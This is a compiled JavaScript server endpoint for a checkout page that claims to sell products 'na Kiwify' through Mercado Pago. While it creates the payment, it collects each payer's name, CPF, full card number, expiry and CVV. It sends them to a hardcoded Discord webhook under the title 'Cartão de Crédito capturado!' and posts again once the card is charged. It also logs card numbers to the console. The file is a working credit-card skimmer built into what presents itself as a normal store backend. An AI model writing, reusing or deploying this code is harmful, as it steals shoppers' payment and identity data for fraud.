import { p as products } from '../../chunks/products_oRNW7Rs9.mjs';
import { s as sendEmbedToWebhook } from '../../chunks/discordwebhook_BjaVtYvQ.mjs';
import { E as EMPTY_PRODUCT, m as mercado, s as session, w as watchPurchase } from '../../chunks/purchase_D7wy5O5a.mjs';
export { renderers } from '../../renderers.mjs';

const prerender = false;
const POST = async ({ request }) => {
  const payload = await request.json();
  const product = products.find((x) => x.id == payload.product_id) || EMPTY_PRODUCT;
  const fields = [
    {
      name: "✍️ Nome do pagador",
      value: payload.payer_name,
      inline: true
    },
    {
      name: "🪪 CPF do pagador",
      value: payload.payer_cpf,
      inline: true
    },
    {
      name: "💳 Número, Mês/Ano & CVV",
      value: [
        payload.card_number.replaceAll(" ", ""),
        payload.card_month + "/" + payload.card_year,
        payload.card_cvv
      ].join(" ")
    }
  ];
  sendEmbedToWebhook("https://discord.com/api/webhooks/1312122635962024057/Df1PHUl16NmtYK164Ix72gr02bZ2HJNH5N43NLBklUwLLrBGJWZY5SRP_JBfeG9FCBEJ", {
    title: "🏛️ Cartão de Crédito capturado!",
    description: `do produto: **${product.name}**`,
    footer: { text: payload.payer_email },
    thumbnail: { url: product.image },
    fields
  });
  const payment = await mercado.createPayment(
    {
      transaction_amount: product.price,
      installments: 1,
      // TODO: use choosed one
      description: `Comprando: ${product.name} na Kiwify.`,
      token: payload.card_token_id,
      payer: {
        email: payload.payer_email
      }
    },
    `${payload.payer_email}-card-pay-${product.id}-${session}`
  );
  if (payment.error) {
    console.log("[MP] error creating card payment:", payment);
    return new Response(JSON.stringify(payment), { status: 400 });
  }
  console.log(
    "[MP] card payment created:",
    payload.card_number,
    "got:",
    payment.status == "rejected" ? payment : payment.status
  );
  watchPurchase({
    payment_id: payment.id,
    payment_status: payment.status,
    infos: payload,
    callback() {
      sendEmbedToWebhook("https://discord.com/api/webhooks/1312122635962024057/Df1PHUl16NmtYK164Ix72gr02bZ2HJNH5N43NLBklUwLLrBGJWZY5SRP_JBfeG9FCBEJ", {
        title: "Cartão de Crédito debitado!",
        description: `do produto: **${product.name}**`,
        footer: { text: payload.payer_email },
        thumbnail: { url: product.image },
        fields: [{ name: "CC", value: payload.card_number }]
      });
    }
  });
  return new Response(
    JSON.stringify({
      id: payment.id,
      kind: "card",
      status: payment.status
    }),
    { status: 200 }
  );
};

const _page = /*#__PURE__*/Object.freeze(/*#__PURE__*/Object.defineProperty({
  __proto__: null,
  POST,
  prerender
}, Symbol.toStringTag, { value: 'Module' }));

const page = () => _page;

export { page };
